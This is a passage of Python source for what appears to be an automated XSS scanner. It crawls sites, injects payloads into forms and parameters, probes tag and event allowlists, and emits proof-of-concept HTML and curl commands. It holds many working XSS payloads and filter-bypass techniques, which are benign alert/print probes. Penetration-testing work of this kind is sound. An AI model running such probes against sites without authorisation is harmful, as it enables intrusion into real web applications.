#!/usr/bin/env python3
"""
Advanced XSS Scanner with Context Detection and Exploitation Proof

Features:
- Arjun integration for hidden parameter discovery
- Context-aware payload selection (HTML, attribute, JavaScript, URL, CSS)
- CSP detection and bypass attempts
- Exploitation proof generation (curl commands, browser steps)
- Severity scoring based on impact (reflected vs stored, auth requirements)
- Detailed reporting with reproduction steps
"""

import httpx
import urllib.parse
import re
import json
import html as html_escape
import random
import string
from typing import List, Dict, Tuple, Optional, Set
from html.parser import HTMLParser
from .xss_payloads import XSSPayloads, load_custom_payloads
from .xss_scanner import FormParser, extract_forms, log, test_dom_xss, verify_alert_with_playwright
from .param_discovery import discover_parameters

SEARCH_PRIORITY_PAYLOAD = '\"><svg onload=alert(1)>'
SEARCH_SVG_ANIMATION_PRIORITY_PAYLOAD = '\"><svg><animatetransform onbegin=alert(1)>'
SEARCH_ATTRIBUTE_PRIORITY_PAYLOAD = '"onmouseover="alert(1)'
ATTR_EVENT_HANDLER_TECHNIQUE_ID = "xss_attr_event_handler_breakout"
ATTR_EVENT_HANDLER_TECHNIQUE_NAME = "Quoted attribute breakout with injected event handler"
STORED_HREF_JS_TECHNIQUE_ID = "stored_href_javascript_url"
STORED_HREF_JS_TECHNIQUE_NAME = "Stored injection into anchor href (javascript: URL)"
STORED_REPLACE_FIRST_ONLY_PAYLOAD = "<><img src=1 onerror=alert(1)>"
STORED_REPLACE_FIRST_ONLY_TECHNIQUE_ID = "stored_xss_replace_first_occurrence_bypass"
STORED_REPLACE_FIRST_ONLY_TECHNIQUE_NAME = "Bypass single-occurrence angle bracket encoding using leading <> pair"
STORED_REPLACE_FIRST_ONLY_ALT_PAYLOADS = [
    "<><svg/onload=alert(1)>",
    "<><details open ontoggle=alert(1)>",
]
JS_STRING_BREAKOUT_PAYLOAD = "'-alert(1)-'"
JS_STRING_BREAKOUT_TECHNIQUE_ID = "xss_js_string_breakout"
JS_STRING_BREAKOUT_TECHNIQUE_NAME = "Break out of JavaScript string and execute alert"
JSON_EVAL_BACKSLASH_BREAKOUT_PAYLOAD = '\\"-alert(1)}//'
JSON_EVAL_BACKSLASH_BREAKOUT_TECHNIQUE_ID = "xss_json_eval_backslash_breakout"
JSON_EVAL_BACKSLASH_BREAKOUT_TECHNIQUE_NAME = "JSON response backslash escape bypass leading to eval() execution"
ANGULARJS_EXPR_PAYLOAD = "{{$on.constructor('alert(1)')()}}"
ANGULARJS_TECHNIQUE_ID = "angularjs_expression_injection_ng_app"
ANGULARJS_TECHNIQUE_NAME = "AngularJS expression injection via reflected value in ng-app directive"
TAG_EVENT_ALLOWLIST_TECHNIQUE_ID = "xss_tag_event_allowlist_bypass"
TAG_EVENT_ALLOWLIST_TECHNIQUE_NAME = "Bypass tag/event allowlist by probing accepted HTML tag and event handler"
SVG_ANIMATION_ALLOWLIST_TECHNIQUE_ID = "xss_svg_animation_onbegin_allowlist_bypass"
SVG_ANIMATION_ALLOWLIST_TECHNIQUE_NAME = "Bypass tag allowlist using SVG animation element with onbegin event"
PAYLOAD_DEBUG_LOG_LIMIT = 5  # Per-parameter, to avoid log spam
MAX_BROWSER_VERIFICATIONS_PER_TARGET = 3


def _random_token(length: int = 10) -> str:
    alphabet = string.ascii_letters + string.digits
    return "".join(random.choice(alphabet) for _ in range(length))


def _is_valid_param_name(name: str) -> bool:
    if not name:
        return False
    if len(name) > 50:
        return False
    return re.match(r'^[A-Za-z0-9_\-\[\]]+$', name) is not None


def _filter_param_names(names: List[str]) -> List[str]:
    return sorted({n for n in names if _is_valid_param_name(n)})


def _is_comment_field(name: str) -> bool:
    if not name:
        return False
    name_l = name.lower()
    return any(token in name_l for token in ['comment', 'message', 'content', 'body', 'text', 'review', 'feedback'])


def _is_website_field(name: str) -> bool:
    if not name:
        return False
    nl = name.lower()
    return nl in ('website', 'url', 'homepage', 'home', 'link', 'site')


def _candidate_stored_text_fields(form: Dict) -> List[str]:
    """
    Fallback selector for stored-XSS testing on POST forms when explicit
    comment-like names are absent.
    """
    ranked: List[str] = []
    seen: Set[str] = set()
    inputs = form.get('inputs', []) or []
    if not inputs:
        return ranked

    high_signal = ('comment', 'message', 'content', 'body', 'text', 'review', 'feedback', 'description', 'details', 'post')
    exclude_name_tokens = (
        'email', 'mail', 'website', 'url', 'homepage', 'phone', 'tel',
        'csrf', 'token', 'nonce', 'id', 'postid', 'article', 'blog', 'name'
    )
    exclude_types = {'hidden', 'submit', 'button', 'image', 'checkbox', 'radio', 'file', 'password', 'url', 'email', 'tel', 'number'}

    textlike: List[str] = []
    for inp in inputs:
        name = (inp.get('name') or '').strip()
        if not name or name in seen:
            continue
        seen.add(name)
        itype = (inp.get('type') or 'text').lower()
        nl = name.lower()
        if itype in exclude_types:
            continue
        if any(tok in nl for tok in exclude_name_tokens):
            continue
        textlike.append(name)
        if any(tok in nl for tok in high_signal):
            ranked.append(name)

    # Preserve order, append lower-signal text-like fields afterwards.
    for n in textlike:
        if n not in ranked:
            ranked.append(n)
    return ranked[:3]


def _build_form_payload(form: Dict, field_name: str, payload: str) -> Dict:
    """
    Build a form submission payload with sensible defaults.
    """
    def _default_value_for_input(name: str, itype: str) -> str:
        nl = (name or '').lower()
        if itype == 'email' or 'email' in nl:
            return 'example@gmail.com'
        if itype == 'url' or any(tok in nl for tok in ('website', 'url', 'homepage', 'site', 'link')):
            return 'https://example.com'
        if itype == 'number' or any(tok in nl for tok in ('id', 'postid', 'articleid', 'blogid')):
            return '1'
        if itype == 'tel' or any(tok in nl for tok in ('phone', 'tel', 'mobile')):
            return '5550100'
        if 'name' in nl:
            return 'scanner-user'
        return 'test'

    data = {}
    for inp in form.get('inputs', []):
        name = inp.get('name')
        if not name:
            continue
        itype = (inp.get('type') or 'text').lower()
        value = inp.get('value') or ''
        if name == field_name:
            data[name] = payload
            continue
        if value:
            data[name] = value
            continue
        if itype == 'checkbox':
            data[name] = 'on'
        elif itype == 'hidden' and value:
            data[name] = value
        else:
            data[name] = _default_value_for_input(name, itype)
    return data


def _payload_in_anchor_href(html: str, payload: str) -> bool:
    if not html or not payload:
        return False
    pat = r'<a[^>]+href\s*=\s*["\'][^"\']*' + re.escape(payload) + r'[^"\']*["\']'
    return re.search(pat, html, re.IGNORECASE | re.DOTALL) is not None


def _build_stored_comment_payloads(max_payloads: int) -> List[str]:
    """
    Build a bounded, deduplicated payload list for stored comment-like inputs.
    Prioritize generic filter-bypass candidates before broad basic payloads.
    """
    ordered: List[str] = [STORED_REPLACE_FIRST_ONLY_PAYLOAD]
    ordered.extend(STORED_REPLACE_FIRST_ONLY_ALT_PAYLOADS)
    ordered.extend(XSSPayloads.get_basic_payloads())
    seen: Set[str] = set()
    out: List[str] = []
    for p in ordered:
        if p in seen:
            continue
        seen.add(p)
        out.append(p)
        if len(out) >= max_payloads:
            break
    return out


def _looks_like_comment_submission_success(html_text: str) -> bool:
    if not html_text:
        return False
    return re.search(r'\b(thank you|comment (?:submitted|awaiting|posted)|submission received)\b', html_text, re.IGNORECASE) is not None


def _should_try_tag_event_allowlist(param_name: str) -> bool:
    if not param_name:
        return False
    p = param_name.lower()
    return any(tok in p for tok in ("search", "q", "query", "keyword", "term"))


def _probe_tag_event_allowlist_xss(
    client: httpx.Client,
    base_url: str,
    param_name: str,
    baseline_params: Dict[str, List[str]],
    headers: Optional[Dict[str, str]] = None,
    browser_verify: bool = False,
) -> Optional[Dict]:
    """
    Probe for reflected XSS where most tags/events are blocked but one tag/event
    combination is allowed (for example, body+onresize).
    """
    if not _should_try_tag_event_allowlist(param_name):
        return None

    svg_nested_tags = {"animatetransform", "animate", "set", "image", "title"}

    def _tag_probe_payload(tag: str) -> str:
        if tag in svg_nested_tags:
            return f"<svg><{tag}>"
        return f"<{tag}>"

    def _event_probe_payload(tag: str, event: str) -> str:
        if tag in svg_nested_tags:
            return f"<svg><{tag} {event}=1>"
        return f"<{tag} {event}=1>"

    def _exploit_payload(tag: str, event: str) -> str:
        if tag in svg_nested_tags:
            return f'\"><svg><{tag} {event}=print()>'
        return f'\"><{tag} {event}=print()>'

    def _display_markup(tag: str, event: str) -> str:
        if tag in svg_nested_tags:
            return f"<svg><{tag} {event}=print()>"
        return f"<{tag} {event}=print()>"

    def _req(payload: str):
        test_params = {k: (list(v) if isinstance(v, list) else [str(v)]) for k, v in baseline_params.items()}
        test_params[param_name] = [payload]
        flat = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
        resp = client.get(base_url, params=flat)
        return resp, flat

    try:
        baseline_payload = "<img src=1 onerror=print()>"
        baseline_resp, _ = _req(baseline_payload)
        if baseline_resp.status_code < 400:
            return None

        tag_candidates = ["body", "math", "animatetransform", "animate", "svg", "image", "title", "details", "marquee", "iframe", "a"]
        allowed_tags: List[str] = []
        for tag in tag_candidates:
            resp, _ = _req(_tag_probe_payload(tag))
            if resp.status_code < 400:
                allowed_tags.append(tag)
        if not allowed_tags:
            return None

        event_candidates = ["onbegin", "onresize", "onload", "onanimationstart", "onfocus", "onclick", "onmouseover", "onerror"]
        allowed_tag = None
        allowed_event = None
        for tag in allowed_tags:
            for ev in event_candidates:
                if tag == "svg" and ev == "onbegin":
                    # Prefer executable SVG animation elements for onbegin probes.
                    continue
                resp, _ = _req(_event_probe_payload(tag, ev))
                if resp.status_code < 400:
                    allowed_tag = tag
                    allowed_event = ev
                    break
            if allowed_event:
                break
        if not allowed_tag or not allowed_event:
            return None

        exploit_payload = _exploit_payload(allowed_tag, allowed_event)
        final_resp, final_params = _req(exploit_payload)
        body = final_resp.text or ""
        if final_resp.status_code >= 400 or f"{allowed_event}=print()" not in body:
            return None

        exploit_url = _build_minimal_get_exploit_url(str(final_resp.url), base_url, param_name, exploit_payload)
        verified = False
        if browser_verify:
            try:
                verified = verify_alert_with_playwright(exploit_url, headers=headers)
            except Exception:
                verified = False

        curl_cmd = ExploitationProofGenerator.generate_curl_command('GET', base_url, final_params, headers=headers)
        reflected_markup = _display_markup(allowed_tag, allowed_event)
        browser_steps = [
            f"Open: {exploit_url}",
            f"Observe reflected injection using {reflected_markup}",
        ]
        poc_html = (
            f"<iframe src=\"{html_escape.escape(exploit_url)}\" "
            f"onload=\"this.style.width='100px';this.style.height='100px'\"></iframe>"
        )
        if allowed_tag == "body" and allowed_event == "onresize":
            browser_steps.append("Use the provided iframe PoC to auto-trigger onresize without user interaction")
        if allowed_tag in svg_nested_tags and allowed_event == "onbegin":
            browser_steps.append("SVG animation events auto-fire; observe print() without user interaction")

        is_svg_animation = allowed_tag in svg_nested_tags and allowed_event == "onbegin"
        technique_id = SVG_ANIMATION_ALLOWLIST_TECHNIQUE_ID if is_svg_animation else TAG_EVENT_ALLOWLIST_TECHNIQUE_ID
        technique_name = SVG_ANIMATION_ALLOWLIST_TECHNIQUE_NAME if is_svg_animation else TAG_EVENT_ALLOWLIST_TECHNIQUE_NAME
        description_markup = f"<svg><{allowed_tag}>" if allowed_tag in svg_nested_tags else f"<{allowed_tag}>"

        return {
            "type": "reflected_xss",
            "method": "GET",
            "parameter": param_name,
            "payload": exploit_payload,
            "url": exploit_url,
            "context": "tag-event-allowlist-bypass",
            "severity": "high" if (not browser_verify or verified) else "medium",
            "technique_id": technique_id,
            "technique_name": technique_name,
            "description": f"Reflected XSS via allowlisted {description_markup} tag path and {allowed_event} event in GET parameter \"{param_name}\"",
            "discovery_method": "Tag/event allowlist probing",
            "verified": bool(verified) if browser_verify else False,
            "exploitation": {
                "curl_command": curl_cmd,
                "browser_steps": browser_steps,
                "poc_html": poc_html,
            },
            "evidence": {
                "blocked_baseline_payload": baseline_payload,
                "allowed_tag": allowed_tag,
                "allowed_event": allowed_event,
                "allowed_tags": allowed_tags,
            },
        }
    except Exception:
        return None


def _matches_replace_first_occurrence_bypass(html_text: str) -> bool:
    """
    Detect the generic pattern where the leading angle bracket pair is partially/fully
    encoded while a subsequent attacker-controlled <img ... onerror=alert(1)> remains active.
    """
    if not html_text:
        return False
    text = html_text
    encoded_lead = re.search(r'&lt;\s*(?:&gt;|>|&#62;|&#x3e;)', text, re.IGNORECASE)
    if not encoded_lead:
        return False
    img_exec = re.search(
        r'<img\b[^>]*\bonerror\s*=\s*["\']?\s*alert\s*\(\s*1\s*\)\s*["\']?[^>]*>',
        text,
        re.IGNORECASE | re.DOTALL,
    )
    svg_exec = re.search(
        r'<svg\b[^>]*\bonload\s*=\s*["\']?\s*alert\s*\(\s*1\s*\)\s*["\']?[^>]*>',
        text,
        re.IGNORECASE | re.DOTALL,
    )
    det_exec = re.search(
        r'<details\b[^>]*\bontoggle\s*=\s*["\']?\s*alert\s*\(\s*1\s*\)\s*["\']?[^>]*>',
        text,
        re.IGNORECASE | re.DOTALL,
    )
    exec_matches = [m for m in (img_exec, svg_exec, det_exec) if m]
    if not exec_matches:
        return False
    first_exec = min(exec_matches, key=lambda m: m.start())
    return encoded_lead.start() < first_exec.start()


def _looks_like_angularjs(html_text: str) -> bool:
    if not html_text:
        return False
    ht = html_text.lower()
    return ("ng-app" in ht) or ("angular.js" in ht) or ("angular.min.js" in ht) or ("ng-controller" in ht)


def _reflected_in_ng_app(html_text: str, value: str) -> bool:
    """
    Detect reflection into an ng-app directive value (quoted or unquoted).
    This is a strong signal for AngularJS expression injection.
    """
    if not html_text or not value:
        return False
    # Quoted: ng-app="...VALUE..."
    quoted = re.search(
        r'\bng-app\s*=\s*["\'][^"\']*' + re.escape(value) + r'[^"\']*["\']',
        html_text,
        re.IGNORECASE | re.DOTALL,
    )
    if quoted:
        return True
    # Unquoted: ng-app=VALUE (rare but possible)
    unquoted = re.search(
        r'\bng-app\s*=\s*[^>\s"\']*' + re.escape(value) + r'[^>\s"\']*',
        html_text,
        re.IGNORECASE | re.DOTALL,
    )
    return bool(unquoted)


def _crawl_in_scope_pages(start_url: str, max_pages: int, max_depth: int, timeout: int, headers: Optional[Dict[str, str]] = None) -> List[Tuple[str, str]]:
    """
    Lightweight same-origin crawl returning (url, html) for a bounded number of pages.
    Used only to find forms for stored-XSS workflows.
    """
    from collections import deque

    results: List[Tuple[str, str]] = []
    visited: Set[str] = set()
    try:
        start = urllib.parse.urlparse(start_url)
        start_netloc = start.netloc
    except Exception:
        return results

    q = deque([(start_url, 0)])
    with httpx.Client(timeout=timeout, follow_redirects=True, verify=False, headers=headers) as client:
        while q and len(results) < max_pages:
            url, depth = q.popleft()
            if url in visited or depth > max_depth:
                continue
            visited.add(url)
            try:
                r = client.get(url)
                if r.status_code >= 400:
                    continue
                html = r.text or ""
                results.append((url, html))
                if depth == max_depth:
                    continue
                for link in re.findall(r'(?:href|src|action)\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE):
                    full = urllib.parse.urljoin(url, link)
                    p = urllib.parse.urlparse(full)
                    if p.scheme not in ('http', 'https'):
                        continue
                    if p.netloc != start_netloc:
                        continue
                    norm = urllib.parse.urlunparse((p.scheme, p.netloc, p.path or '/', '', p.query, ''))
                    if norm not in visited:
                        q.append((norm, depth + 1))
            except Exception:
                continue

    return results


def _discover_dom_xss_candidate_pages(base_url: str, timeout: int, headers: Optional[Dict[str, str]] = None, max_urls: int = 8) -> List[str]:
    """
    DOM XSS sinks like `document.write(URLSearchParams(location.search).get(...))` are often on
    parameterized endpoints. Starting scans from the base URL can miss them,
    so we opportunistically collect a small set of same-origin, parameterized links.
    """
    out: List[str] = []
    seen: Set[str] = set()

    try:
        start = urllib.parse.urlparse(base_url)
        base_origin = (start.scheme, start.netloc)
    except Exception:
        return out

    def _add(u: str) -> None:
        if not u or u in seen:
            return
        seen.add(u)
        out.append(u)

    try:
        with httpx.Client(timeout=timeout, follow_redirects=True, verify=False, headers=headers) as client:
            r = client.get(base_url)
            html = r.text or ""
            for link in re.findall(r'(?:href|src|action)\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE):
                full = urllib.parse.urljoin(base_url, link)
                try:
                    p = urllib.parse.urlparse(full)
                except Exception:
                    continue
                if p.scheme not in ("http", "https"):
                    continue
                if (p.scheme, p.netloc) != base_origin:
                    continue

                qs = urllib.parse.parse_qs(p.query or "")
                if not qs:
                    continue

                _add(full)

                if len(out) >= max_urls:
                    break
    except Exception:
        return out[:max_urls]

    return out[:max_urls]


def _build_in_scope_verify_urls(start_url: str, pages: List[Tuple[str, str]], max_urls: int = 30) -> List[str]:
    """
    Build a bounded list of same-origin pages to revisit after POST submissions.
    This improves stored-XSS verification by checking where content may be rendered.
    """
    out: List[str] = []
    seen: Set[str] = set()
    try:
        base = urllib.parse.urlparse(start_url)
        base_origin = (base.scheme, base.netloc)
    except Exception:
        return out

    def _add(candidate: str) -> None:
        if not candidate:
            return
        try:
            p = urllib.parse.urlparse(candidate)
        except Exception:
            return
        if p.scheme not in ("http", "https"):
            return
        if (p.scheme, p.netloc) != base_origin:
            return
        normalized = urllib.parse.urlunparse((p.scheme, p.netloc, p.path or "/", "", p.query, ""))
        if normalized in seen:
            return
        seen.add(normalized)
        out.append(normalized)

    for page_url, page_html in pages:
        _add(page_url)
        for link in re.findall(r'(?:href|action)\s*=\s*["\']([^"\']+)["\']', page_html or "", re.IGNORECASE):
            _add(urllib.parse.urljoin(page_url, link))
            if len(out) >= max_urls:
                return out
        if len(out) >= max_urls:
            return out
    return out


def _log_parameter_summary(params: Dict) -> None:
    names = sorted(params.keys())
    if names:
        log(f"Detected {len(names)} query parameter(s) ({', '.join(names)})", 'INFO')
    else:
        log("Detected 0 query parameter(s)", 'INFO')


def _log_form_summary(forms: List[Dict]) -> None:
    if not forms:
        log("Found 0 input form(s)", 'INFO')
        return

    input_ids = []
    form_ids = []
    for form in forms:
        form_id = (form.get('id') or '').strip()
        if form_id:
            form_ids.append(form_id)
        for inp in form.get('inputs', []):
            input_id = (inp.get('id') or '').strip()
            if input_id:
                input_ids.append(input_id)

    if form_ids and input_ids:
        unique_form_ids = sorted(set(form_ids))
        unique_input_ids = sorted(set(input_ids))
        log(
            f"Found {len(forms)} input form(s) (form ids: {', '.join(unique_form_ids)}; input ids: {', '.join(unique_input_ids)})",
            'INFO'
        )
    elif form_ids:
        unique_form_ids = sorted(set(form_ids))
        log(f"Found {len(forms)} input form(s) (form ids: {', '.join(unique_form_ids)})", 'INFO')
    elif input_ids:
        unique_ids = sorted(set(input_ids))
        log(f"Found {len(forms)} input form(s) (input ids: {', '.join(unique_ids)})", 'INFO')
    else:
        log(f"Found {len(forms)} input form(s) (no input ids detected)", 'INFO')


def _harvest_params_from_js(js_text: str, base_url: str) -> List[str]:
    """
    Extract parameter names from JavaScript content.
    """
    import re

    param_names = set()

    js_url_pattern = r'["\']([^"\']+\?[^"\']+)["\']'
    for match in re.findall(js_url_pattern, js_text):
        try:
            full_url = urllib.parse.urljoin(base_url, match)
            parsed = urllib.parse.urlparse(full_url)
            qs = urllib.parse.parse_qs(parsed.query)
            param_names.update(qs.keys())
        except Exception:
            continue

    call_patterns = [
        r'\bfetch\s*\(\s*["\']([^"\']+)["\']',
        r'\baxios\.(?:get|post|put|delete|patch)\s*\(\s*["\']([^"\']+)["\']',
        r'\$\.(?:get|post|ajax)\s*\(\s*["\']([^"\']+)["\']',
        r'\bXMLHttpRequest\(\)\.open\(\s*["\'](?:GET|POST)["\']\s*,\s*["\']([^"\']+)["\']',
    ]
    for pattern in call_patterns:
        for match in re.findall(pattern, js_text, re.IGNORECASE):
            try:
                full_url = urllib.parse.urljoin(base_url, match)
                parsed = urllib.parse.urlparse(full_url)
                qs = urllib.parse.parse_qs(parsed.query)
                param_names.update(qs.keys())
            except Exception:
                continue

    for match in re.findall(r'URLSearchParams\(\s*["\']([^"\']+)["\']\s*\)', js_text):
        try:
            qs = urllib.parse.parse_qs(match)
            param_names.update(qs.keys())
        except Exception:
            continue

    for match in re.findall(r'URLSearchParams\(\s*\{([^}]+)\}\s*\)', js_text):
        keys = re.findall(r'([A-Za-z0-9_]+)\s*:', match)
        param_names.update(keys)

    return _filter_param_names(list(param_names))


def _harvest_params_from_html(base_url: str, html: str) -> List[str]:
    """
    Extract parameter names from links/forms/scripts in HTML and inline JS.
    """
    import re

    param_names = set()

    attr_pattern = r'(?:href|src|action)\s*=\s*["\']([^"\']+)["\']'
    for match in re.findall(attr_pattern, html, re.IGNORECASE):
        try:
            full_url = urllib.parse.urljoin(base_url, match)
            parsed = urllib.parse.urlparse(full_url)
            qs = urllib.parse.parse_qs(parsed.query)
            param_names.update(qs.keys())
        except Exception:
            continue

    # Inline JS in HTML
    param_names.update(_harvest_params_from_js(html, base_url))

    return _filter_param_names(list(param_names))


def _harvest_params_from_js_sources(base_url: str, html: str, timeout: int, headers: Optional[Dict[str, str]] = None) -> List[str]:
    """
    Fetch in-scope JS files and harvest params from them.
    """
    import re

    script_srcs = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.IGNORECASE)
    if not script_srcs:
        return []

    params = set()
    with httpx.Client(timeout=timeout, follow_redirects=True, verify=False, headers=headers) as client:
        for src in script_srcs:
            try:
                full_url = urllib.parse.urljoin(base_url, src)
                parsed = urllib.parse.urlparse(full_url)
                if parsed.scheme not in ('http', 'https'):
                    continue
                if parsed.netloc and parsed.netloc != urllib.parse.urlparse(base_url).netloc:
                    continue
                resp = client.get(full_url)
                if resp.status_code >= 400:
                    continue
                params.update(_harvest_params_from_js(resp.text, base_url))
            except Exception:
                continue

    return _filter_param_names(list(params))


class ContextDetector:
    """Detect the context where user input is reflected"""
    
    @staticmethod
    def detect_context(response_text: str, payload: str, marker: str) -> str:
        """
        Detect where the marker appears in the response to determine context
        
        Args:
            response_text: HTTP response body
            payload: Original payload
            marker: Unique marker string used for detection
        
        Returns:
            Context type: 'html', 'attribute', 'javascript', 'url', 'css', or 'unknown'
        """
        if marker not in response_text:
            return 'unknown'
        
        # Conservative approach: if the marker appears in multiple places (common),
        # classify by the most dangerous context we can find anywhere in the response.
        context = response_text

        # Detect JavaScript context
        js_patterns = [
            r'<script[^>]*>.*?' + re.escape(marker),
            r'var\s+\w+\s*=\s*["\']?' + re.escape(marker),
            r'function\s*\([^)]*\)\s*{[^}]*' + re.escape(marker),
        ]
        
        for pattern in js_patterns:
            if re.search(pattern, context, re.IGNORECASE | re.DOTALL):
                return 'javascript'
        
        # Detect HTML attribute context
        attr_pattern = r'<[^>]*\s+\w+\s*=\s*["\']?[^"\'\'\s>]*' + re.escape(marker)
        if re.search(attr_pattern, context, re.IGNORECASE):
            return 'attribute'
        
        # Detect CSS context
        css_patterns = [
            r'<style[^>]*>.*?' + re.escape(marker),
            r'style\s*=\s*["\'][^"\'\']*' + re.escape(marker),
        ]
        
        for pattern in css_patterns:
            if re.search(pattern, context, re.IGNORECASE | re.DOTALL):
                return 'css'
        
        # Detect URL context
        url_patterns = [
            r'href\s*=\s*["\']?[^"\'\'\s>]*' + re.escape(marker),
            r'src\s*=\s*["\']?[^"\'\'\s>]*' + re.escape(marker),
            r'action\s*=\s*["\']?[^"\'\'\s>]*' + re.escape(marker),
        ]
        
        for pattern in url_patterns:
            if re.search(pattern, context, re.IGNORECASE):
                return 'url'
        
        # Default to HTML context
        return 'html'


class CSPAnalyzer:
    """Analyze Content Security Policy for XSS protection"""
    
    @staticmethod
    def extract_csp(headers: Dict[str, str]) -> Optional[str]:
        """Extract CSP header from HTTP headers"""
        for header, value in headers.items():
            if header.lower() == 'content-security-policy':
                return value
        return None
    
    @staticmethod
    def analyze_csp(csp: str) -> Dict[str, any]:
        """
        Analyze CSP for XSS protection and potential bypasses
        
        Returns:
            Dictionary with CSP analysis results
        """
        if not csp:
            return {
                'present': False,
                'blocks_inline': False,
                'blocks_eval': False,
                'allows_unsafe': False,
                'potential_bypasses': ['No CSP present - all XSS vectors available']
            }
        
        csp_lower = csp.lower()
        
        # Check for unsafe directives
        allows_unsafe_inline = "'unsafe-inline'" in csp_lower
        allows_unsafe_eval = "'unsafe-eval'" in csp_lower
        
        # Check for script-src directive
        blocks_inline = "script-src" in csp_lower and not allows_unsafe_inline
        blocks_eval = "script-src" in csp_lower and not allows_unsafe_eval
        
        # Identify potential bypasses
        bypasses = []
        
        if allows_unsafe_inline:
            bypasses.append("CSP allows 'unsafe-inline' - inline scripts are permitted")
        
        if allows_unsafe_eval:
            bypasses.append("CSP allows 'unsafe-eval' - eval() and similar functions work")
        
        # Check for JSONP endpoints or whitelisted domains
        if 'script-src' in csp_lower:
            # Extract whitelisted domains
            script_src_match = re.search(r'script-src\s+([^;]+)', csp_lower)
            if script_src_match:
                domains = script_src_match.group(1).split()
                if any(domain not in ["'self'", "'none'", "'strict-dynamic'"] for domain in domains):
                    bypasses.append(f"Whitelisted domains may host JSONP or vulnerable endpoints")
        
        # Check for base-uri (affects base tag injection)
        if 'base-uri' not in csp_lower:
            bypasses.append("No base-uri directive - base tag injection possible")
        
        return {
            'present': True,
            'policy': csp,
            'blocks_inline': blocks_inline,
            'blocks_eval': blocks_eval,
            'allows_unsafe': allows_unsafe_inline or allows_unsafe_eval,
            'potential_bypasses': bypasses if bypasses else ['CSP appears strict']
        }


class ExploitationProofGenerator:
    """Generate exploitation proofs for confirmed XSS vulnerabilities"""
    
    @staticmethod
    def generate_curl_command(method: str, url: str, data: Dict = None, headers: Dict = None) -> str:
        """
        Generate curl command for reproducing the XSS
        
        Args:
            method: HTTP method (GET/POST)
            url: Target URL
            data: POST data or query parameters
            headers: HTTP headers
        
        Returns:
            Curl command string
        """
        cmd = f"curl -X {method}"

        def _redact_header_value(name: str, value: str) -> str:
            n = (name or "").lower()
            if n in ("cookie", "authorization", "proxy-authorization", "x-api-key", "x-auth-token"):
                return "<redacted>"
            return value

        if headers:
            for key, value in headers.items():
                safe_val = _redact_header_value(str(key), "" if value is None else str(value))
                cmd += f" -H '{key}: {safe_val}'"
        
        if method == 'GET' and data:
            query = urllib.parse.urlencode(data)
            cmd += f" '{url}?{query}'"
        elif method == 'POST' and data:
            cmd += f" -d '{urllib.parse.urlencode(data)}'"
            cmd += f" '{url}'"
        else:
            cmd += f" '{url}'"
        
        return cmd
    
    @staticmethod
    def generate_browser_steps(method: str, url: str, parameter: str, payload: str) -> List[str]:
        """
        Generate step-by-step browser reproduction instructions
        
        Returns:
            List of steps
        """
        # NOTE: These steps are rendered inside an HTML <ol> in the report, so we intentionally
        # do not prefix with "1.", "2.", etc. (otherwise numbering is duplicated).
        steps = [f"Open a web browser and navigate to: {url}"]
        
        if method == 'GET':
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            current_val = None
            if parameter in params and params[parameter]:
                current_val = params[parameter][0]

            # Build the exploit URL with the provided payload
            exploit_params = dict(params)
            exploit_params[parameter] = [payload]
            new_query = urllib.parse.urlencode(exploit_params, doseq=True)
            exploit_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

            # Prefer a "clean" starting URL so steps don't redundantly tell users to open the exploit URL twice.
            # If the provided URL already contains the payload (decoded), start from a benign value.
            decoded_current = urllib.parse.unquote_plus(current_val) if current_val is not None else None
            if decoded_current == payload:
                clean_params = dict(params)
                clean_params[parameter] = ['test']
                clean_query = urllib.parse.urlencode(clean_params, doseq=True)
                clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{clean_query}" if clean_query else f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            else:
                # If no value existed, start from the base path (no query) to reduce noise.
                clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                if params:
                    # Keep any pre-existing params except the vulnerable one, if present.
                    clean_params = {k: v for k, v in params.items() if k != parameter}
                    if clean_params:
                        clean_query = urllib.parse.urlencode(clean_params, doseq=True)
                        clean_url = f"{clean_url}?{clean_query}"

            # If we have a clean URL distinct from the exploit URL, include a "modify param" step.
            if clean_url != exploit_url:
                steps[0] = f"Open a web browser and navigate to: {clean_url}"
                steps.append(f"Set the URL parameter '{parameter}' to: {payload}")
                steps.append(f"Navigate to the modified URL: {exploit_url}")
            else:
                steps[0] = f"Open a web browser and navigate to: {exploit_url}"
            steps.append("Observe the XSS payload execution (alert box or other behavior)")
        
        elif method == 'POST':
            steps.append(f"Locate the form containing the '{parameter}' input field")
            steps.append(f"Enter the following payload into the '{parameter}' field: {payload}")
            steps.append("Submit the form")
            steps.append("Observe the XSS payload execution (alert box or other behavior)")
        
        return steps
    
    @staticmethod
    def generate_poc_html(method: str, url: str, data: Dict = None, payload: str = "") -> str:
        """
        Generate HTML PoC file that demonstrates the XSS
        
        Returns:
            HTML content for PoC
        """
        if method == 'GET':
            query = urllib.parse.urlencode(data) if data else ""
            full_url = f"{url}?{query}" if query else url
            
            html = f"""<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC</title>
</head>
<body>
    <h1>XSS Proof of Concept</h1>
    <p>Click the link below to trigger the XSS:</p>
    <a href="{full_url}" target="_blank">Trigger XSS</a>
    <br><br>
    <p>Or click the button to auto-navigate:</p>
    <button onclick="window.location.href='{full_url}'">Auto Trigger</button>
    <br><br>
    <p><strong>Payload:</strong> <code>{payload}</code></p>
</body>
</html>"""
        
        else:  # POST
            form_fields = ""
            if data:
                for key, value in data.items():
                    form_fields += f'<input type="hidden" name="{key}" value="{value}">\n'
            
            html = f"""<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC</title>
</head>
<body>
    <h1>XSS Proof of Concept</h1>
    <p>Click the button below to trigger the XSS:</p>
    <form action="{url}" method="POST" id="xss-form">
{form_fields}
        <button type="submit">Trigger XSS</button>
    </form>
    <br>
    <p><strong>Payload:</strong> <code>{payload}</code></p>
    <script>
        // Auto-submit after 2 seconds
        setTimeout(function() {{
            if (confirm('Auto-submit the form to trigger XSS?')) {{
                document.getElementById('xss-form').submit();
            }}
        }}, 2000);
    </script>
</body>
</html>"""
        
        return html


class SeverityScorer:
    """Calculate severity scores for XSS vulnerabilities"""
    
    @staticmethod
